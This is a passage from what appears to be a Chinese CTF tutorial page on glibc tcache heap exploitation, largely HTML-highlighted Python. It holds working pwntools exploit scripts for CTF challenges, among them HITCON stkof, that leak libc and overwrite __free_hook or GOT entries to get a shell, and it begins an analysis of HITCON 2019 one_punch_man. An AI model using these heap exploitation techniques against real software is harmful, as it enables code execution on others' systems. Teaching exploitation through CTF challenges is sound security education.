    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x3e</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1"># overwrite the file-structure</span>

    <span class="nb">print</span><span class="p">(</span><span class="nb">repr</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)))</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;leak!!!!!!!!!&quot;</span><span class="p">)</span>
    <span class="n">info1</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="nb">repr</span><span class="p">(</span><span class="n">info1</span><span class="p">))</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">info1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3ed8b0</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc @ &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f322</span><span class="p">))</span> <span class="c1"># one gadget with $rsp+0x40 = NULL</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</code></pre></div>
<h5 id="challenge-2">Challenge 2 小结<a class="headerlink" href="#challenge-2" title="Permanent link">&para;</a></h5>
<p>这个程序的利用过程是一个有用的技巧，这种通过文件结构体的方式来实现内存的读写的相关资料可以参考台湾 Angelboy 的博客。在 hctf2018 steak 中，也存在一个信息泄露的问题，大多数人采用了 copy puts_addr 到 <code>__free_hook</code> 指针里实现信息泄露，但实际上也可以通过修改文件结构体的字段来实现信息泄露。</p>
<h4 id="challenge-3-2014-hitcon-stkof">Challenge 3 : 2014 HITCON stkof<a class="headerlink" href="#challenge-3-2014-hitcon-stkof" title="Permanent link">&para;</a></h4>
<h5 id="_10">基本信息<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h5>
<p>参见<a href="../unlink-zh/#2014 HITCON stkof">unlink HITCON stkof 简介</a></p>
<h5 id="libc-226-tcache">libc 2.26 tcache 利用方法<a class="headerlink" href="#libc-226-tcache" title="Permanent link">&para;</a></h5>
<p>本题可以溢出较长字节，因此可以覆盖 chunk 的 fd 指针，在 libc 2.26 之后的 tcache 机制中，未对 fd 指针指向的 chunk 进行 size 检查，从而可以将 fd 指针覆盖任意地址。在 free 该被溢出 chunk 并且两次 malloc 后可以实现任意地址修改：</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">GdbWrapper</span> <span class="kn">import</span> <span class="n">GdbWrapper</span>
<span class="kn">from</span> <span class="nn">one_gadget</span> <span class="kn">import</span> <span class="n">generate_one_gadget</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;info&quot;</span>
<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&quot;little&quot;</span>
<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">64</span>
<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&quot;linux&quot;</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;amd64&quot;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;deepin-terminal&quot;</span><span class="p">,</span> <span class="s2">&quot;-x&quot;</span><span class="p">,</span> <span class="s2">&quot;zsh&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">buf</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">(</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">3</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="nb">print</span> <span class="n">tmp</span>
    <span class="k">if</span> <span class="s2">&quot;OK&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tmp</span> <span class="ow">and</span> <span class="s2">&quot;FAIL&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">tmp</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">poc</span><span class="p">):</span>
    <span class="c1"># test env</span>
    <span class="n">bss_ptrlist</span> <span class="o">=</span> <span class="kc">None</span>
    <span class="n">free_index</span> <span class="o">=</span> <span class="kc">None</span>
    <span class="n">free_try</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
    <span class="n">libc_real</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">[:</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
    <span class="k">assert</span> <span class="n">elf</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s2">&quot;amd64&quot;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">libc_real</span> <span class="o">+</span> <span class="s2">&quot;libc-2.27.so&quot;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">libc_real</span> <span class="o">+</span> <span class="s2">&quot;libc-2.26.so&quot;</span><span class="p">))</span>
    <span class="k">while</span> <span class="n">bss_ptrlist</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
        <span class="c1"># find bss ptr</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
        <span class="n">gdbwrapper</span> <span class="o">=</span> <span class="n">GdbWrapper</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
        <span class="c1"># gdb.attach(io)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;c&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;d&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">heap</span> <span class="o">=</span> <span class="n">gdbwrapper</span><span class="o">.</span><span class="n">heap</span><span class="p">()</span>
        <span class="n">heap</span> <span class="o">=</span> <span class="p">[(</span><span class="n">k</span><span class="p">,</span> <span class="n">heap</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">heap</span><span class="o">.</span><span class="n">keys</span><span class="p">())]</span>
        <span class="n">ptr_addr</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">heap</span><span class="p">:</span>
                <span class="n">address</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                <span class="n">info</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                <span class="n">ptr_addr_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">info</span><span class="p">[</span><span class="s2">&quot;mchunk_size&quot;</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffffffe</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x410</span><span class="p">:</span>
                    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">gdbwrapper</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;bytes&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">):</span>
                        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">==</span> <span class="n">x</span><span class="p">[</span><span class="s2">&quot;ADDR&quot;</span><span class="p">]:</span>
                            <span class="n">tmp</span> <span class="o">=</span> <span class="n">gdbwrapper</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;qword&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s2">&quot;ADDR&quot;</span><span class="p">])</span>
                            <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
                                <span class="k">if</span> <span class="n">binary</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">y</span><span class="p">[</span><span class="s2">&quot;PATH&quot;</span><span class="p">]:</span>
                                    <span class="n">ptr_addr</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">y</span><span class="p">[</span><span class="s2">&quot;ADDR&quot;</span><span class="p">])</span>
                                    <span class="k">break</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ptr_addr_length</span><span class="p">):</span>
                            <span class="k">break</span>
                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ptr_addr_length</span><span class="p">:</span>
                    <span class="k">break</span>
            <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">==</span> <span class="mi">5</span><span class="p">):</span>
                <span class="k">break</span>
        <span class="n">bss_ptrlist</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">while</span> <span class="n">free_index</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_try</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_try</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1041</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">))</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
            <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
            <span class="n">free_index</span> <span class="o">=</span> <span class="n">free_try</span>
        <span class="n">free_try</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="c1"># arbitrary write</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span><span class="o">.</span><span class="n">libc</span>
    <span class="n">one_gadget_offsets</span> <span class="o">=</span> <span class="n">generate_one_gadget</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">one_gadget_offset</span> <span class="ow">in</span> <span class="n">one_gadget_offsets</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
        <span class="n">gdbwrapper</span> <span class="o">=</span> <span class="n">GdbWrapper</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_index</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1041</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_ptrlist</span> <span class="o">-</span> <span class="mh">0x08</span><span class="p">))</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="c1">###leak libc</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;free&quot;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;malloc&quot;</span><span class="p">]))</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]))</span>
        <span class="n">leaked</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">2</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
        <span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;malloc&quot;</span><span class="p">]</span>
        <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
        <span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">one_gadget_offset</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">))</span>
        <span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">)</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">))</span>
        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">continue</span>
        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./bins/a679df07a8f3a8d590febad45336d031-stkof&quot;</span>
    <span class="n">main</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
</code></pre></div>
<h4 id="challenge-4-hitcon-2019-one_punch_man">Challenge 4 : HITCON 2019 one_punch_man<a class="headerlink" href="#challenge-4-hitcon-2019-one_punch_man" title="Permanent link">&para;</a></h4>
<h5 id="_11">基本信息<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h5>
<p>开启了常见保护，题目环境为 glibc 2.29 ，使用 seccomp 开启了沙箱保护，只有白名单上的系统调用可以使用。</p>
<div class="highlight"><pre><span></span><code>╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master› 
╰─$ checksec ./one_punch
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/wz/Desktop/CTF/xz_files/hitcon2019_one_punch_man/one_punch&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master*› 
╰─$ seccomp-tools dump ./one_punch
 line  CODE  JT   JF      <span class="nv">K</span>
<span class="o">=================================</span>
 <span class="m">0000</span>: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
 <span class="m">0001</span>: 0x15 0x01 0x00 0xc000003e  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0003</span>
 <span class="m">0002</span>: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
 <span class="m">0003</span>: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
 <span class="m">0004</span>: 0x15 0x00 0x01 0x0000000f  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> rt_sigreturn<span class="o">)</span> goto <span class="m">0006</span>
 <span class="m">0005</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0006</span>: 0x15 0x00 0x01 0x000000e7  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> exit_group<span class="o">)</span> goto <span class="m">0008</span>
 <span class="m">0007</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0008</span>: 0x15 0x00 0x01 0x0000003c  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> <span class="nb">exit</span><span class="o">)</span> goto <span class="m">0010</span>
 <span class="m">0009</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0010</span>: 0x15 0x00 0x01 0x00000002  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> open<span class="o">)</span> goto <span class="m">0012</span>
 <span class="m">0011</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0012</span>: 0x15 0x00 0x01 0x00000000  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> <span class="nb">read</span><span class="o">)</span> goto <span class="m">0014</span>
 <span class="m">0013</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0014</span>: 0x15 0x00 0x01 0x00000001  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> write<span class="o">)</span> goto <span class="m">0016</span>
 <span class="m">0015</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0016</span>: 0x15 0x00 0x01 0x0000000c  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> brk<span class="o">)</span> goto <span class="m">0018</span>
 <span class="m">0017</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0018</span>: 0x15 0x00 0x01 0x00000009  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> mmap<span class="o">)</span> goto <span class="m">0020</span>
 <span class="m">0019</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0020</span>: 0x15 0x00 0x01 0x0000000a  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> mprotect<span class="o">)</span> goto <span class="m">0022</span>
 <span class="m">0021</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0022</span>: 0x15 0x00 0x01 0x00000003  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> close<span class="o">)</span> goto <span class="m">0024</span>
 <span class="m">0023</span>: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 <span class="m">0024</span>: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
</code></pre></div>
<h5 id="_12">基本功能<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h5>
<p>Add 函数可以分配 <code>[0x80,0x400]</code> 大小的堆块，分配的函数为 <code>calloc</code> ，输入数据首先存储到栈上，之后再使用 <code>strncpy</code> 拷贝到 <code>bss</code> 上的数组里。</p>
<p>Delete 函数 <code>free</code> 堆块之后未清空，造成 <code>double free</code> 和 <code>UAF</code></p>
<p><div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">Delete</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>

  <span class="n">MyPuts</span><span class="p">(</span><span class="s">&quot;idx: &quot;</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
